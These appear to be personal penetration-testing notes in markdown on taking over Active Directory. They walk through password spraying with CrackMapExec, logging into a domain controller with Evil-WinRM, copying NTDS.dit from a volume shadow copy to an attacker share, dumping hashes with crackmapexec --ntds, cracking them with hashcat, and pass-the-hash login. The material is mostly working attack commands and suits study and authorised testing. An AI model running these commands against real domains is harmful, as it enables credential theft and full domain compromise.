# Terms
### NTDS
- NT Directory Services used with AD to find & organiza network resources.
- stored at %systemroot$/ntds
### .dit
- directory information tree
- primary database file associated with AD, storing domain usernames, password hashses and critical schema information

## Using CrackMapExec
- Generate custom usernames
```bash
username-anarchy -i names.txt
```
- Use CrackMapExec 
```bash
crackmapexec smb $IP -u $USERNAME -p /usr/share/wordlists/fasttrack.txt
```

---------------------
# Capture NTDS.dit
----------------------------
## Method 1
- Connect to ad DC with Evil-WinRM
```bash
evil-winrm -i $IP -u $USERNAME -p $PASSWORD
```
- Check local memebership
```bash
net localgroup
```
- To get a copy of NTDS.dit file, we need local admin (Administrators group) or Domain Admin rights (Domain Admins group)
- Check user account Privileges including Domain
```bash
net user $USERNAME
```
- Create a shadow copy of C:\\ using Vssadmin (Volume Shadow Copy)
```bash
vssadmin CREATE SHADOW /For=C:
```
- Copy NTDS.dit from the VSS
```bash
cmd.exe \c copy \\?\GLOBALROOT\Device\HarddiskVolumeShdowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
```
- Transfer NTDS.dit to Attack Host
```bash
cmd.exe /c move C:\NTDS\NTDS.dit \\$IP\$share-folder
```

## Method 2
- A faster method using crackmapexec to capture NTDS.dit
```bash
crackmapexec smb $IP -u $USERNAME -p $PASSWORD --ntds
```
- Use hashcat to crack passwords
```bash
sudo hashcat -m 1000 $hash rockyou.txt
```

## Pass-the-Hash 
```bash
evil-winrm -i $IP -U Administrator -H $hash
```
